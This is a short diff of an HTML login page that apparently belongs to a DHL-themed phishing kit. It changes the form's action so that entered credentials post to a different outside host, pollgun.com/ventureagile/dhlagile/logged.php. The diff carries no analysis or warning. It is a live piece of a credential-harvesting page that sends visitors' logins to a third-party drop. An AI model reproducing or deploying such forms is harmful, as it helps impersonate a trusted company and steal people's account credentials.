@@ -21,7 +21,7 @@
 
 <blockquote>
 
-	  <FORM Name="login" action="https://bozoktraktor.com/ventureagile/logged.php" method="post">
+	  <FORM Name="login" action="https://pollgun.com/ventureagile/dhlagile/logged.php" method="post">
 		
 	    <table bgcolor="#E4E4E4" cellpadding="5" cellspacing="0" align="center">
 	<tr valign=top bgcolor="#cc0000">
